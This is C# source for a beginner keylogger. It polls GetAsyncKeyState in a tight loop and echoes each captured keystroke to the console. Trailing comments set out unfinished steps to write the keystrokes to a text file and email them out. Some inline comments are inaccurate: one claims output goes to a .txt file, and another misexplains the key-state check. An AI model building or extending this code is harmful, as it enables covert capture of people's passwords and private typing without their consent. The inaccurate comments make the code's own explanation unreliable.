using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace Logger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i); // gets user keypresses, specifically what the keypress was

        //string to hold all keystrokes
        static string keyLog = "";
        static void Main(string[] args)
        {
            //1 - capture keystrokes and display to console
            while (true)
            {
                //pause and let other programs get a chance to run
                Thread.Sleep(5);
                //check all keys on keyboard for their states
                for (int i = 32; i < 127; i++) // loops through all possible ascii key presses within the range of alphabetical keys (32-127)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769) // asserts max range of key presses
                    {
                        Console.Write((char)i + ", "); // prints new key press character to .txt file
                    }

                }
            }
            //2 - store the stokes to a text file
            //3 - send file to an email
        }
    }
}
